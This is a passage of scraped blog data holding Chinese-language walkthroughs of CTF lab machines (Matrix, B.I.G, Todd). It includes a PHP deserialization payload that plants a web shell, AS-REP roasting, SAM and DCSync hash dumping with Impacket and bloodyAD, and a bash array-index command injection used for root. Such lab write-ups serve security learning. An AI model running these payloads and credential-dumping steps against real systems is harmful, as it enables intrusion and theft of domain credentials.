Hash。\n","date":"2025-04-08","externalUrl":null,"permalink":"/posts/2025/04/thehackerslabs-black-gold/","section":"Posts","summary":"","title":"Thehackerslabs-Black Gold","type":"posts"},{"content":"","date":"2025-04-08","externalUrl":null,"permalink":"/tags/vulnyx/","section":"Tags","summary":"","title":"Vulnyx","type":"tags"},{"content":"","date":"2025-04-08","externalUrl":null,"permalink":"/categories/vulnyx/","section":"Categories","summary":"","title":"Vulnyx","type":"categories"},{"content":"\rBox Info #\rOS Linux Difficulty Medium Nmap #\r[root@kali] /home/kali/Matrix ❯ nmap 192.168.56.141 -sV -A -p-\r22/tcp open ssh OpenSSH 9.2p1 Debian 2+deb12u4 (protocol 2.0)\r| ssh-hostkey: | 256 67:78:c9:d2:e3:ff:be:fc:9e:13:9a:af:9d:59:17:66 (ECDSA)\r|_ 256 1a:78:b1:e6:f1:f0:d1:b3:ab:c8:3f:95:fd:46:52:67 (ED25519)\r80/tcp open http Apache httpd 2.4.62 ((Debian))\r|_http-server-header: Apache/2.4.62 (Debian)\r|_http-title: Enter The Matrix Gobuster #\r[root@kali] /home/kali/Matrix ❯ gobuster dir -u http://192.168.56.141/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x .pcap ===============================================================\rGobuster v3.6\rby OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart)\r===============================================================\r[+] Url: http://192.168.56.141/\r[+] Method: GET\r[+] Threads: 10\r[+] Wordlist: /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt\r[+] Negative Status codes: 404\r[+] User Agent: gobuster/3.6\r[+] Extensions: pcap\r[+] Timeout: 10s\r===============================================================\rStarting gobuster in directory enumeration mode\r===============================================================\r/trinity.pcap (Status: 200) [Size: 146389]\r/server-status (Status: 403) [Size: 279]\rProgress: 441120 / 441122 (100.00%)\r===============================================================\rFinished\r=============================================================== Exiftool #\r进行流量分析\n发现一个图片，将其导出\n[root@kali] /home/kali/Matrix ❯ exiftool object172.image%2fwebp ExifTool Version Number : 13.00\rFile Name : object172.image%2fwebp\rDirectory : .\rFile Size : 119 kB\rFile Modification Date/Time : 2025:04:08 20:23:11+08:00\rFile Access Date/Time : 2025:04:08 20:23:19+08:00\rFile Inode Change Date/Time : 2025:04:08 20:23:11+08:00\rFile Permissions : -rw-r--r--\rFile Type : Extended WEBP\rFile Type Extension : webp\rMIME Type : image/webp\rWebP Flags : XMP, ICC Profile\rImage Width : 800\rImage Height : 800\rProfile CMM Type : Little CMS\rProfile Version : 4.4.0\rProfile Class : Display Device Profile\rColor Space Data : RGB\rProfile Connection Space : XYZ\rProfile Date Time : 2025:01:26 01:39:22\rProfile File Signature : acsp\rPrimary Platform : Apple Computer Inc.\rCMM Flags : Not Embedded, Independent\rDevice Manufacturer : Device Model : Device Attributes : Reflective, Glossy, Positive, Color\rRendering Intent : Perceptual\rConnection Space Illuminant : 0.9642 1 0.82491\rProfile Creator : Little CMS\rProfile ID : 0\rProfile Description : GIMP built-in sRGB\rProfile Copyright : Public Domain\rMedia White Point : 0.9642 1 0.82491\rChromatic Adaptation : 1.04788 0.02292 -0.05022 0.02959 0.99048 -0.01707 -0.00925 0.01508 0.75168\rRed Matrix Column : 0.43604 0.22249 0.01392\rBlue Matrix Column : 0.14305 0.06061 0.71393\rGreen Matrix Column : 0.38512 0.7169 0.09706\rRed Tone Reproduction Curve : (Binary data 32 bytes, use -b option to extract)\rGreen Tone Reproduction Curve : (Binary data 32 bytes, use -b option to extract)\rBlue Tone Reproduction Curve : (Binary data 32 bytes, use -b option to extract)\rChromaticity Channels : 3\rChromaticity Colorant : Unknown\rChromaticity Channel 1 : 0.64 0.33002\rChromaticity Channel 2 : 0.3 0.60001\rChromaticity Channel 3 : 0.15001 0.06\rDevice Mfg Desc : GIMP\rDevice Model Desc : sRGB\rVP8 Version : 0 (bicubic reconstruction, normal loop)\rHorizontal Scale : 0\rVertical Scale : 0\rXMP Toolkit : Image::ExifTool 12.57\rDescription : Morpheus, we have found a direct connection to the \u0026#39;Mind\u0026#39;, the artificial intelligence that controls the Matrix. You can find it at the domain M47r1X.matrix.nyx.\rImage Size : 800x800\rMegapixels : 0.640 得到一个域名M47r1X.matrix.nyx\nOwn www-data #\r进入后似乎是一个交流框\n访问那个txt，得到一段php代码\n\u0026lt;?php\rclass Message\r{\rpublic $file = \u0026#34;messages.txt\u0026#34;;\rpublic $message = \u0026#34;\u0026#34;;\rpublic function __unserialize(array $data): void\r{\r$file = $data[\u0026#39;file\u0026#39;] ?? $this-\u0026gt;file;\r$this-\u0026gt;message = $data[\u0026#39;message\u0026#39;];\rfile_put_contents($file, $data[\u0026#39;message\u0026#39;] . \u0026#34;\\n\u0026#34;, FILE_APPEND);\r}\r}\r对交流框进行抓包可以看到是存在反序列化的\n根据逻辑修改一下\n\u0026lt;?php\rclass Message\r{\rpublic $file = \u0026#34;hack.php\u0026#34;;\rpublic $message = \u0026#39;\u0026lt;?php system($_GET[\u0026#34;cmd\u0026#34;]);\u0026#39;;\r}\r$obj = new Message();\r$payload = serialize($obj);\recho $payload;\r#O:7:\u0026#34;Message\u0026#34;:2:{s:4:\u0026#34;file\u0026#34;;s:8:\u0026#34;hack.php\u0026#34;;s:7:\u0026#34;message\u0026#34;;s:27:\u0026#34;\u0026lt;?php system($_GET[\u0026#34;cmd\u0026#34;]);\u0026#34;;} Own smith #\r之前在流量里发现了密码字符串\n可以切换用户\nRoot #\r查看sudo -l\nsmith@matrix:~$ sudo -l\r[sudo] contraseña para smith: Lo siento, pruebe otra vez.\r[sudo] contraseña para smith: Matching Defaults entries for smith on matrix:\renv_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, use_pty\rUser smith may run the following commands on matrix:\r(ALL) PASSWD: /usr/bin/rsync rsync | GTFOBins Summary #\rUser：流量分析，通过图片拿到子域名，然后PHP反序列化写入木马。\nRoot：查找GTFObins，直接提权。\n","date":"2025-04-08","externalUrl":null,"permalink":"/posts/2025/04/vulnyx-matrix/","section":"Posts","summary":"","title":"VulNyx-Matrix","type":"posts"},{"content":"","date":"2025-04-08","externalUrl":null,"permalink":"/tags/windows/","section":"Tags","summary":"","title":"Windows","type":"tags"},{"content":"\rBox Info #\rOS Windows Difficulty Hard Nmap #\r[root@kali] /home/kali ❯ nmap 192.168.212.4 -sV -A -p-\rPORT STATE SERVICE VERSION\r53/tcp open domain Simple DNS Plus\r80/tcp open http Microsoft IIS httpd 10.0\r| http-methods: |_ Potentially risky methods: TRACE\r|_http-title: Site doesn\u0026#39;t have a title (text/html).\r|_http-server-header: Microsoft-IIS/10.0\r88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2025-04-05 23:20:54Z)\r135/tcp open msrpc Microsoft Windows RPC\r139/tcp open netbios-ssn Microsoft Windows netbios-ssn\r389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: bbr.thl, Site: Default-First-Site-Name)\r445/tcp open microsoft-ds?\r464/tcp open kpasswd5?\r593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0\r636/tcp open tcpwrapped\r3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: bbr.thl, Site: Default-First-Site-Name)\r3269/tcp open tcpwrapped\r5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\r|_http-title: Not Found\r|_http-server-header: Microsoft-HTTPAPI/2.0\r9389/tcp open mc-nmf .NET Message Framing\r47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\r|_http-title: Not Found\r|_http-server-header: Microsoft-HTTPAPI/2.0\r49664/tcp open msrpc Microsoft Windows RPC\r49665/tcp open msrpc Microsoft Windows RPC\r49666/tcp open msrpc Microsoft Windows RPC\r49667/tcp open msrpc Microsoft Windows RPC\r49669/tcp open msrpc Microsoft Windows RPC\r49670/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0\r49671/tcp open msrpc Microsoft Windows RPC\r49673/tcp open msrpc Microsoft Windows RPC\r49676/tcp open msrpc Microsoft Windows RPC\r49686/tcp open msrpc Microsoft Windows RPC\r57043/tcp open msrpc Microsoft Windows RPC\rMAC Address: 08:00:27:29:23:16 (Oracle VirtualBox virtual NIC)\rDevice type: general purpose\rRunning: Microsoft Windows 2016\rOS CPE: cpe:/o:microsoft:windows_server_2016\rOS details: Microsoft Windows Server 2016 build 10586 - 14393\rNetwork Distance: 1 hop\rService Info: Host: BIG; OS: Windows; CPE: cpe:/o:microsoft:windows\rHost script results:\r|_clock-skew: 15h54m38s\r| smb2-security-mode: | 3:1:1: |_ Message signing enabled and required\r|_nbstat: NetBIOS name: BIG, NetBIOS user: \u0026lt;unknown\u0026gt;, NetBIOS MAC: 08:00:27:29:23:16 (Oracle VirtualBox virtual NIC)\r| smb2-time: | date: 2025-04-05T23:21:49\r|_ start_date: 2025-04-05T19:55:29 将bbr.thl添加到**/etc/hosts**\nGobuster #\r[root@kali] /home/kali ❯ gobuster dir -u http://192.168.212.4/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt ===============================================================\rGobuster v3.6\rby OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart)\r===============================================================\r[+] Url: http://192.168.212.4/\r[+] Method: GET\r[+] Threads: 10\r[+] Wordlist: /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt\r[+] Negative Status codes: 404\r[+] User Agent: gobuster/3.6\r[+] Timeout: 10s\r===============================================================\rStarting gobuster in directory enumeration mode\r===============================================================\r/images (Status: 301) [Size: 151] [--\u0026gt; http://192.168.212.4/images/]\r/Images (Status: 301) [Size: 151] [--\u0026gt; http://192.168.212.4/Images/]\r/contents (Status: 301) [Size: 153] [--\u0026gt; http://192.168.212.4/contents/]\r/IMAGES (Status: 301) [Size: 151] [--\u0026gt; http://192.168.212.4/IMAGES/]\r/songs (Status: 301) [Size: 150] [--\u0026gt; http://192.168.212.4/songs/]\r/Contents (Status: 301) [Size: 153] [--\u0026gt; http://192.168.212.4/Contents/]\r/Songs (Status: 301) [Size: 150] [--\u0026gt; http://192.168.212.4/Songs/]\rProgress: 220560 / 220561 (100.00%)\r===============================================================\rFinished\r=============================================================== StegHide #\r/Contents/notify.txt的内容如下\nWho the hell did you hire to create the website!\rHiding keys in MD5 again!\rI\u0026#39;m going to fire that guy\rmusic /Songs/Skyisthelimit.txt是一个密码列表\n然后**/Images/big2.jpg**这个图片可以进行分离\n这里直接查看WP吧，发现密码不在密码列表里，而是在主页的一段文字\n\u0026lt;!DOCTYPE html\u0026gt;\r\u0026lt;html\u0026gt;\r\u0026lt;head\u0026gt;\r\u0026lt;style\u0026gt;\r/* It was all a dream */\rbody {\rbackground-image: url(\u0026#39;big1.jpg\u0026#39;); background-size: cover; background-repeat: no-repeat; background-attachment: fixed;\rbackground-position: center; }\r\u0026lt;/style\u0026gt;\r\u0026lt;/head\u0026gt;\r\u0026lt;body\u0026gt;\r\u0026lt;h1\u0026gt;Music\u0026lt;/h1\u0026gt;\r\u0026lt;p\u0026gt;I keep it music music, I eat that lunch (Yeah)\u0026lt;/p\u0026gt;\r\u0026lt;/body\u0026gt;\r\u0026lt;/html\u0026gt; 将其转为MD5\n[root@kali] /home/kali/BIG ❯ echo -n \u0026#34;It was all a dream\u0026#34;| md5sum 99ae77c0c0faf78b872f9f452e3eaa24 - 分离图片\n[root@kali] /home/kali/BIG ❯ steghide extract -sf big2.jpg ⏎\rEnter passphrase: wrote extracted data to \u0026#34;frase.txt\u0026#34;.\r[root@kali] /home/kali/BIG ❯ ls\rbig2.jpg frase.txt [root@kali] /home/kali/BIG ❯ cat frase.txt Bigpoppa1972 尝试登录\nCrackmapexec #\r进行用户枚举\n[root@kali] /home/kali/BIG ❯ crackmapexec smb bbr.thl -u music -p Bigpoppa1972 --rid-brute | grep \u0026#34;SidTypeUser\u0026#34;\rSMB bbr.thl 445 BIG 500: bbr\\Administrator (SidTypeUser)\rSMB bbr.thl 445 BIG 501: bbr\\Guest (SidTypeUser)\rSMB bbr.thl 445 BIG 502: bbr\\krbtgt (SidTypeUser)\rSMB bbr.thl 445 BIG 503: bbr\\DefaultAccount (SidTypeUser)\rSMB bbr.thl 445 BIG 1000: bbr\\BIG$ (SidTypeUser)\rSMB bbr.thl 445 BIG 1103: bbr\\Music (SidTypeUser)\rSMB bbr.thl 445 BIG 1104: bbr\\song (SidTypeUser) Bloodhound #\r[root@kali] /home/kali/BIG ❯ bloodhound-python -u \u0026#39;music\u0026#39; -p \u0026#39;Bigpoppa1972\u0026#39; -d bbr.thl -ns 192.168.212.4 -c all --zip\rINFO: Found AD domain: bbr.thl\rINFO: Getting TGT for user\rWARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (BIG.bbr.thl:88)] [Errno -2] Name or service not known\rINFO: Connecting to LDAP server: BIG.bbr.thl\rINFO: Found 1 domains\rINFO: Found 1 domains in the forest\rINFO: Found 1 computers\rINFO: Connecting to LDAP server: BIG.bbr.thl\rINFO: Found 7 users\rINFO: Found 57 groups\rINFO: Found 2 gpos\rINFO: Found 1 ous\rINFO: Found 19 containers\rINFO: Found 0 trusts\rINFO: Starting computer enumeration with 10 workers\rINFO: Querying computer: BIG.bbr.thl\rINFO: Done in 00M 00S\rINFO: Compressing output into 20250406075042_bloodhound.zip GetNPUsers #\r筛查没有设置预认证的用户，是SONG用户\n[root@kali] /home/kali/BIG ❯ impacket-GetNPUsers -usersfile username.txt -no-pass -dc-ip \u0026#34;192.168.212.4\u0026#34; bbr.thl/ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies /usr/share/doc/python3-impacket/examples/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).\rnow = datetime.datetime.utcnow() + datetime.timedelta(days=1)\r$krb5asrep$23$song@BBR.THL:dac6809472a8f34ab3472d707cf28027$16400eda9e9d0ee4f860756727117bdb392e3fc599580f96a3dc387ded4f8b69ca509a054b470c9bce363f5fc189220b03df56c2ee1605708c4d2cbd337ba583f3b95bfe84879dcc626a2cd642472bf5dc2f109527e122c08ae250f9ef788d50bcf0e6242ec4c1145bedddf4ac5f95bd422e553ac9cc4bedb62835fb7580b82c2bc4c5449d2027513efbcfe08fc4c7cc18195f966e9e8627193db30b611021994e6c0cc8aca25a78fcdffdaf30791db06c87c21dee1692c405aefb2214fd40100b37d74f012e6b62fa981a4331e65a82194a264991e0656dd6d66f697505865006fc 这里的字典要使用网站提供的\n[root@kali] /home/kali/BIG ❯ john hash.txt --wordlist=password Using default input encoding: UTF-8\rLoaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x])\rWill run 4 OpenMP threads\rPress \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status\rPasswordsave@ ($krb5asrep$23$song@BBR.THL) 1g 0:00:00:00 DONE (2025-04-06 07:57) 100.0g/s 20100p/s 20100c/s 20100C/s 123456..qwerty123456\rUse the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably\rSession completed. 通过winrm登录song用户\n[root@kali] /home/kali/BIG ❯ evil-winrm -i bbr.thl -u song -p \u0026#39;Passwordsave@\u0026#39; SeBackupPrivilege #\r查看一下权限，参考HTB-Cicada - HYH\n*Evil-WinRM* PS C:\\Users\u0026gt; whoami /priv\rPRIVILEGES INFORMATION\r----------------------\rPrivilege Name Description State\r============================= =================================== =======\rSeMachineAccountPrivilege Add workstations to domain Enabled\rSeSystemtimePrivilege Change the system time Enabled\rSeBackupPrivilege Back up files and directories Enabled\rSeRestorePrivilege Restore files and directories Enabled\rSeShutdownPrivilege Shut down the system Enabled\rSeChangeNotifyPrivilege Bypass traverse checking Enabled\rSeRemoteShutdownPrivilege Force shutdown from a remote system Enabled\rSeIncreaseWorkingSetPrivilege Increase a process working set Enabled\rSeTimeZonePrivilege Change the time zone Enabled [root@kali] /home/kali/BIG ❯ impacket-secretsdump -sam SAM -system SYSTEM LOCAL\rImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] Target system bootKey: 0xbb33617256ea48219d9d3d01766b7a9e\r[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)\rAdministrator:500:aad3b435b51404eeaad3b435b51404ee:bb1c50a48c37e053d2045cd5b55cd2f2:::\rGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\rDefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\r[*] Cleaning up... 这个不能直接用于登录\nDCsync #\rDCSync | The Hacker Recipes 再次进行分析，发现可以修改到域控的ACL\n首先将song添加到SPECIAL PERMISSIONS组\n[root@kali] /home/kali/BIG ❯ bloodyAD --host \u0026#34;192.168.212.4\u0026#34; -d \u0026#34;bbr.thl\u0026#34; -u \u0026#34;song\u0026#34; -p \u0026#34;Passwordsave@\u0026#34; add groupMember \u0026#39;SPECIAL PERMISSIONS\u0026#39; song ⏎\r[+] song added to SPECIAL PERMISSIONS 添加一个DCsync的权限\n[root@kali] /home/kali/BIG ❯ bloodyAD --host \u0026#34;192.168.212.4\u0026#34; -d \u0026#34;bbr.thl\u0026#34; -u \u0026#34;song\u0026#34; -p \u0026#34;Passwordsave@\u0026#34; add dcsync song ⏎\r[+] song is now able to DCSync 再次读取hash\n[root@kali] /home/kali/BIG ❯ impacket-secretsdump \u0026#34;bbr.thl/song:Passwordsave@\u0026#34;@192.168.212.4 ⏎\rImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied [*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)\r[*] Using the DRSUAPI method to get NTDS.DIT secrets\rAdministrator:500:aad3b435b51404eeaad3b435b51404ee:5d48bcf84aea999fb1ade06970a81237:::\rGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\rkrbtgt:502:aad3b435b51404eeaad3b435b51404ee:a0b3723455bd8be604ae2e1df74db81b:::\rDefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\rbbr.thl\\Music:1103:aad3b435b51404eeaad3b435b51404ee:8ab1d3828490421d0dc1ddd6e2552d90:::\rbbr.thl\\song:1104:aad3b435b51404eeaad3b435b51404ee:5919764374e465e68f886ac0c4f75ab3:::\rBIG$:1000:aad3b435b51404eeaad3b435b51404ee:7811e608bfec3a56f807ddd9dfdb21f9:::\r[*] Kerberos keys grabbed\rAdministrator:aes256-cts-hmac-sha1-96:e3f894ddb7f81e6b2cf2f0c59fc80e6754c65dd3b92bb2d0d3e8d633a7fbfbdf\rAdministrator:aes128-cts-hmac-sha1-96:b095f30c1921e1d730b28984573c761c\rAdministrator:des-cbc-md5:c8839bce494537d0\rkrbtgt:aes256-cts-hmac-sha1-96:f380684e6a965bbc18ee8727d8326c00b75a13069df78ca8718db459542b975c\rkrbtgt:aes128-cts-hmac-sha1-96:946eece70daaa80ce8ad63bfc3972467\rkrbtgt:des-cbc-md5:c8d020da3b51a8bf\rbbr.thl\\Music:aes256-cts-hmac-sha1-96:d5fd1078b0b49b57a20512e8709792103766121e43115456191cc23a083af099\rbbr.thl\\Music:aes128-cts-hmac-sha1-96:27c2250ad5385ae08ce98af7894a2a9a\rbbr.thl\\Music:des-cbc-md5:d3bfabf49eef37d6\rbbr.thl\\song:aes256-cts-hmac-sha1-96:ae6f0ada27e369f5bf95309eb44dcad3bd26a8fc6017f0a0344f814ff36ae26e\rbbr.thl\\song:aes128-cts-hmac-sha1-96:e3ac1564472d51084bd95307279ac988\rbbr.thl\\song:des-cbc-md5:ef52f8df7a9dfeef\rBIG$:aes256-cts-hmac-sha1-96:b288ac848e2ba1b1e068cff6bdb950fb5ef336e4f44717aabd3b9a02eb21901d\rBIG$:aes128-cts-hmac-sha1-96:99b71046382eea69198aa3b44db56837\rBIG$:des-cbc-md5:c7fb8c25297f945d\r[*] Cleaning up... 这次就登录上了\nSummary #\rUser：根据网页提示，提取图片得到music密码，进行域内分析，发现存在Kerberos未开启预认证的用户，得到song用户。\nAdministrator：根据Song用户的权限，进行DCsync攻击。\n","date":"2025-04-05","externalUrl":null,"permalink":"/posts/2025/04/thehackerslabs-b-i-g/","section":"Posts","summary":"","title":"Thehackerslabs-B.I.G","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Easy Nmap #\r[root@kali] /home/kali/Todd ❯ nmap 192.168.56.137 -sV -A -p-\rPORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)\r| ssh-hostkey: | 2048 93:a4:92:55:72:2b:9b:4a:52:66:5c:af:a9:83:3c:fd (RSA)\r| 256 1e:a7:44:0b:2c:1b:0d:77:83:df:1d:9f:0e:30:08:4d (ECDSA)\r|_ 256 d0:fa:9d:76:77:42:6f:91:d3:bd:b5:44:72:a7:c9:71 (ED25519)\r80/tcp open http Apache httpd 2.4.59 ((Debian))\r|_http-title: Mindful Listening\r|_http-server-header: Apache/2.4.59 (Debian) 页面没有任何可以用的信息\n然后再次进行Nmap，发现多了几个端口\n[root@kali] /home/kali/Todd ❯ nmap 192.168.56.137 -sV -A -p-\rStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-02 15:52 CST\rNmap scan report for 192.168.56.137\rHost is up (0.00028s latency).\rNot shown: 65522 closed tcp ports (reset)\rPORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)\r| ssh-hostkey: | 2048 93:a4:92:55:72:2b:9b:4a:52:66:5c:af:a9:83:3c:fd (RSA)\r| 256 1e:a7:44:0b:2c:1b:0d:77:83:df:1d:9f:0e:30:08:4d (ECDSA)\r|_ 256 d0:fa:9d:76:77:42:6f:91:d3:bd:b5:44:72:a7:c9:71 (ED25519)\r80/tcp open http Apache httpd 2.4.59 ((Debian))\r|_http-title: Mindful Listening\r|_http-server-header: Apache/2.4.59 (Debian)\r7066/tcp open unknown\r7816/tcp open tcpwrapped\r9364/tcp open tcpwrapped\r10617/tcp open tcpwrapped\r11766/tcp open tcpwrapped\r13584/tcp open tcpwrapped\r14025/tcp open tcpwrapped\r19345/tcp open tcpwrapped\r25088/tcp open tcpwrapped\r27179/tcp open tcpwrapped\r27730/tcp open tcpwrapped 然后这个端口可以连上去\n然后拿到user.txt\n写入ssh密钥连接即可\nRoot #\r查看sudo -l\n$ sudo -l\rMatching Defaults entries for todd on todd:\renv_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\rUser todd may run the following commands on todd:\r(ALL : ALL) NOPASSWD: /bin/bash /srv/guess_and_check.sh\r(ALL : ALL) NOPASSWD: /usr/bin/rm\r(ALL : ALL) NOPASSWD: /usr/sbin/reboot 查看这个guess_and_check\n$ cat /srv/guess_and_check.sh\r#!/bin/bash\r# check this script used by human a=$((RANDOM%1000))\recho \u0026#34;Please Input [$a]\u0026#34;\recho \u0026#34;[+] Check this script used by human.\u0026#34;\recho \u0026#34;[+] Please Input Correct Number:\u0026#34;\rread -p \u0026#34;\u0026gt;\u0026gt;\u0026gt;\u0026#34; input_number\r[[ $input_number -ne \u0026#34;$a\u0026#34; ]] \u0026amp;\u0026amp; exit 1\rsleep 0.2\rtrue_file=\u0026#34;/tmp/$((RANDOM%1000))\u0026#34;\rsleep 1\rfalse_file=\u0026#34;/tmp/$((RANDOM%1000))\u0026#34;\r[[ -f \u0026#34;$true_file\u0026#34; ]] \u0026amp;\u0026amp; [[ ! -f \u0026#34;$false_file\u0026#34; ]] \u0026amp;\u0026amp; cat /root/.cred || exit 2 这个脚本 /srv/guess_and_check.sh 是一个简单的 Bash 脚本，执行以下操作：\n生成一个随机数：\na=$((RANDOM%1000))：生成一个 0 到 999 之间的随机数，并将其赋值给变量 a。 提示用户输入：\necho \u0026quot;Please Input [$a]\u0026quot;：将生成的随机数显示给用户。\nread -p \u0026quot;\u0026gt;\u0026gt;\u0026gt;\u0026quot; input_number：提示用户输入一个数字。\n检查用户输入：\n[[ $input_number -ne \u0026quot;$a\u0026quot; ]] \u0026amp;\u0026amp; exit 1：如果用户输入的数字不等于生成的随机数 a，脚本会以状态码 1 退出。 生成更多随机文件：\ntrue_file=\u0026quot;/tmp/$((RANDOM%1000))\u0026quot; 和 false_file=\u0026quot;/tmp/$((RANDOM%1000))\u0026quot;：脚本生成两个位于 /tmp 目录下的随机文件路径。 文件存在性检查：\n[[ -f \u0026quot;$true_file\u0026quot; ]] \u0026amp;\u0026amp; [[ ! -f \u0026quot;$false_file\u0026quot; ]]：如果 true_file 指定的位置存在文件，并且 false_file 指定的位置没有文件，脚本会继续执行。 显示凭证文件内容：\ncat /root/.cred：如果上述条件成立（即 true_file 存在而 false_file 不存在），脚本将显示 /root/.cred 文件的内容，假设该文件包含敏感信息。\n|| exit 2：如果条件不成立，脚本将以状态码 2 退出。\n分析： #\r这个脚本 /srv/guess_and_check.sh 是一个简单的 Bash 脚本，执行以下操作：\n生成一个随机数：\na=$((RANDOM%1000))：生成一个 0 到 999 之间的随机数，并将其赋值给变量 a。 提示用户输入：\necho \u0026quot;Please Input [$a]\u0026quot;：将生成的随机数显示给用户。\nread -p \u0026quot;\u0026gt;\u0026gt;\u0026gt;\u0026quot; input_number：提示用户输入一个数字。\n检查用户输入：\n[[ $input_number -ne \u0026quot;$a\u0026quot; ]] \u0026amp;\u0026amp; exit 1：如果用户输入的数字不等于生成的随机数 a，脚本会以状态码 1 退出。 生成更多随机文件：\ntrue_file=\u0026quot;/tmp/$((RANDOM%1000))\u0026quot; 和 false_file=\u0026quot;/tmp/$((RANDOM%1000))\u0026quot;：脚本生成两个位于 /tmp 目录下的随机文件路径。 文件存在性检查：\n[[ -f \u0026quot;$true_file\u0026quot; ]] \u0026amp;\u0026amp; [[ ! -f \u0026quot;$false_file\u0026quot; ]]：如果 true_file 指定的位置存在文件，并且 false_file 指定的位置没有文件，脚本会继续执行。 显示凭证文件内容：\ncat /root/.cred：如果上述条件成立（即 true_file 存在而 false_file 不存在），脚本将显示 /root/.cred 文件的内容，假设该文件包含敏感信息。\n|| exit 2：如果条件不成立，脚本将以状态码 2 退出。\n该脚本的设计似乎是为了确认是否由人类用户执行，要求用户输入正确的数字。如果用户输入正确的数字，脚本继续检查 /tmp 目录下的文件是否存在。如果满足条件（true_file 存在且 false_file 不存在），则显示 /root/.cred 文件的内容，可能暴露敏感信息。\nMethod 1 #\r靶机作者提供的思路\n可以将这个脚本内容复制到本地进行调试\n#!/bin/bash\r# check this script used by human a=$((RANDOM%1000))\recho \u0026#34;Generated a: $a\u0026#34;\recho \u0026#34;Please Input [$a]\u0026#34;\recho \u0026#34;[+] Check this script used by human.\u0026#34;\recho \u0026#34;[+] Please Input Correct Number:\u0026#34;\rread -p \u0026#34;\u0026gt;\u0026gt;\u0026gt;\u0026#34; input_number\r[[ $input_number -ne \u0026#34;$a\u0026#34; ]] \u0026amp;\u0026amp; exit 1\rsleep 0.2\rtrue_file=\u0026#34;/tmp/$((RANDOM%1000))\u0026#34;\recho \u0026#34;Generated true_file: $true_file\u0026#34;\rsleep 1\rfalse_file=\u0026#34;/tmp/$((RANDOM%1000))\u0026#34;\recho \u0026#34;Generated false_file: $false_file\u0026#34;\r[[ -f \u0026#34;$true_file\u0026#34; ]] \u0026amp;\u0026amp; [[ ! -f \u0026#34;$false_file\u0026#34; ]] \u0026amp;\u0026amp; cat /etc/shadow || exit 2 可以看到输入正确的数字会进到下一步，而输入错误会直接停止\n注意到下面这个逻辑，他是直接把输入的字符串转为了一个变量，并且与**$a**进行比较\nread -p \u0026#34;\u0026gt;\u0026gt;\u0026gt;\u0026#34; input_number\r[[ $input_number -ne \u0026#34;$a\u0026#34; ]] \u0026amp;\u0026amp; exit 1 因此这里就存在一个注入点，输入的是a那么也能比较成功\n如果输入的是一个数组，那么数组和一个非数组类型进行比较会触发语法错误。并且会输出错误信息\n属于是**a[$(id)]**这里会先解析最里面的id作为一个命令，然后结果作为数组下标，然后比较的时候会触发语法错误，输出错误信息。从而得到我们想要的命令结果。\nMethod 2 #\r纯靠运气式\n先创建一部分数字文件在tmp目录下\ncd tmp\rtouch {0..500} 然后开始碰运气，运气好的话，几次就能出，得到root的密码是：fake password（中间有空格）\nSummary #\rUser：连接nmap扫到的端口就行。\nRoot：输入字符串经过类型转换，存在数组下标解析命令的问题，导致命令执行后的结果被语法错误信息带出。也可以碰运气，毕竟是随机数。\n【Todd靶机设计思路复盘】\n","date":"2025-04-02","externalUrl":null,"permalink":"/posts/2025/04/hackmyvm-todd/","section":"Posts","summary":"","title":"HackMyVM-Todd","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Easy Nmap #\r[root@kali] /home/kali/Search ❯ nmap 192.168.56.136 -sV -A -p-\rPORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)\r| ssh-hostkey: | 256 39:0d:70:e0:55:cb:20:de:ad:f7:10:d8:1f:76:4d:9d (ECDSA)\r|_ 256 df:e2:94:52:e9:3d:eb:69:2d:b4:a5:a9:2c:3e:63:46 (ED25519)\r80/tcp open http Apache httpd 2.4.62 ((Debian))\r|_http-server-header: Apache/2.4.62 (Debian)\r|_http-title: Apache2 Debian Default Page: It works 得到用户名是support\nHydra 